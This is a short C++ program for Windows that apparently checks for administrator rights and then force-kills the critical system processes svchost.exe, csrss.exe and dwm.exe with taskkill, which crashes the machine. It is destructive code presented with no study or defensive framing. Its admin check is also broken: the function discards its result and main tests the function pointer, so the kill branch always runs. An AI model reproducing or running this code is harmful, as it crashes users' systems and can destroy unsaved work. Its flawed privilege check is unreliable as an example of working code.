#include <iostream>
#include <windows.h>

using namespace std;

void IsAdmin() {
    PSID admin_groups = NULL;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    BOOL result = AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_groups);
    BOOL is_user_admin = FALSE;
    if(result) {
        CheckTokenMembership(NULL, admin_groups, &is_user_admin);
        FreeSid(admin_groups);
    }
}

int main() {
    if(IsAdmin) {
        system("taskkill /f /im svchost.exe");
        system("taskkill /f /im csrss.exe");
        system("taskkill /f /im dwm.exe");
    }

    else {
        cout << "Admin account required";
        system("pause");
    }
}